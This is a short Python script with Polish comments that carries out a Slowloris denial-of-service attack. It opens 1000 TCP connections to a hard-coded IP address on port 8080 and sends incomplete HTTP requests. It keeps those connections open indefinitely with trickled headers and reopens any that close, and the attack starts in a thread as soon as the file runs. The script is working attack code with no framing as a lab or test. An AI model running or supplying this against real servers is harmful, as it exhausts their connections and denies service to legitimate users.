import socket
import time
import threading

# Adres serwera i port
server_ip = "212.182.24.27"
server_port = 8080

# Liczba gniazd TCP do utworzenia
num_sockets = 1000
sockets = []


def slowloris_attack():
    # Tworzenie gniazd
    for i in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((server_ip, server_port))
            sockets.append(s)

            # Wysłanie podstawowych nagłówków HTTP
            s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {server_ip}\r\n".encode("utf-8"))
            s.send(
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n".encode(
                    "utf-8"))
            s.send("Accept-Language: en-US,en;q=0.5\r\n".encode("utf-8"))
        except socket.error:
            break

    while True:
        for s in list(sockets):
            try:
                # Wysłanie dodatkowych nagłówków HTTP
                s.send(f"X-a: b\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(s)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((server_ip, server_port))
                    sockets.append(s)

                    s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
                    s.send(f"Host: {server_ip}\r\n".encode("utf-8"))
                    s.send(
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n".encode(
                            "utf-8"))
                    s.send("Accept-Language: en-US,en;q=0.5\r\n".encode("utf-8"))
                except socket.error:
                    continue
        time.sleep(100)


# Uruchomienie ataku w wątku
thread = threading.Thread(target=slowloris_attack)
thread.start()
